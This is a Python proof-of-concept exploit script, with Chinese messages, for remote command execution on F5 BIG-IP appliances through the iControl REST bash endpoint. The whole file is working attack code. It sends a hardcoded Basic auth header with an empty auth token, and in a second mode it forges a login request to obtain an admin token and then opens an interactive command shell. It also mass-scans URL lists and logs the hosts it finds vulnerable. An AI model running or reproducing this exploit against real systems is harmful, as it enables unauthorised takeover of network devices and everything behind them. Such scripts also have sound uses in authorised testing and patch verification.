import requests
import json
import argparse
import re
import json
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

t = int(time.time())

def poc_1(target_url, command):
    print(target_url)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Content-Type': 'application/json',
        'X-F5-Auth-Token': '',
        'Authorization': 'Basic YWRtaW46QVNhc1M='
    }
    data = {'command': "run",'utilCmdArgs':"-c '{0}'".format(command)}
    # proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    check_url = target_url + '/mgmt/tm/util/bash'
    try:
        r = requests.post(url=check_url, json=data, headers=headers, verify=False, timeout=20)
        if r.status_code == 200 and 'commandResult' in r.text:
            default = json.loads(r.text)
            display = default['commandResult']
            save_file(target_url, t)
            print('[+] 存在漏洞 {0}'.format(target_url))
            print('$ > {0}'.format(display))
        else:
            print('[-] 不存在漏洞')        
    except Exception as e:
        print('url 访问异常 {0}'.format(target_url))

def ssrf_poc(target_url):
    check_url = target_url + '/mgmt/shared/authn/login'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = json.dumps({'bigipAuthCookie': '', 'username': 'admin', 'loginReference': {'link': '/shared/gossip'}, 'userReference': {'link': 'https://localhost/mgmt/shared/authz/users/admin'}})
    try:
        # 获取 token 值
        r1 = requests.post(url=check_url, headers=headers, data=data, verify=False, timeout=20)
        if r1.status_code == 200 and '/mgmt/shared/authz/tokens/' in r1.text:
            default = json.loads(r1.text)
            token_value = default['token']['token']
            print('[+] Get Token : {0}'.format(token_value))
            # 执行命令 ，同 poc_1()
            command_url = target_url + '/mgmt/tm/util/bash'
            headers['Content-Type'] = 'application/json'
            headers['X-F5-Auth-Token'] = token_value
            # command_value = 'id'
            while True:
                command_value = str(input('command: '))
                if command_value == 'exit':
                    break
                else:
                    data_command = {'command': "run",'utilCmdArgs':"-c '{0}'".format(command_value)}
                    try:
                        r2 = requests.post(url=command_url, headers=headers, json=data_command, verify=False, timeout=20)
                        if r2.status_code == 200 and 'commandResult' in r2.text:
                            default = json.loads(r2.text)
                            display = default['commandResult']
                            print('$ > {0}'.format(display))
                        else:
                            print('命令执行异常，请重试')
                    except Exception as e:
                        print('服务异常')
        else:
            print('[-] 获取 Token 异常')
    except Exception as e:
        print('[-] 获取 Token 异常')


def save_file(target_url, t):
    output_name = 'Output_{0}.txt'.format(t)
    f = open(output_name, 'a')
    f.write(target_url + '\n')
    f.close()

def format_url(url):
    try:
        if url[:4] != "http":
            url = "https://" + url
            url = url.strip()
        return url
    except Exception as e:
        print('URL 错误 {0}'.format(url))

def main():
    parser = argparse.ArgumentParser("f5 rce poc")
    parser.add_argument('-u', '--url', type=str, help=' 目标URL ')
    parser.add_argument('-f', '--file', type=str, help=' 批量文件路径 ')
    parser.add_argument('-c', '--command', type=str, default="id", help=' 执行命令 ')
    parser.add_argument('-s', '--ssrf', action='store_true', help=' 使用ssrf获取token执行命令 ')
    args = parser.parse_args()

    url = args.url
    file = args.file
    command = args.command

    if args.ssrf:
        target_url = format_url(url)
        ssrf_poc(target_url)
    elif not url is None:
        target_url = format_url(url)
        poc_1(target_url, command)
    elif file != '':
        for url_link in open(file, 'r', encoding='utf-8'):
            if url_link.strip() != '':
                url_path = format_url(url_link.strip())
                poc_1(url_path, command)
    else:
        sys.exit(0)     

if __name__ == '__main__':
    main()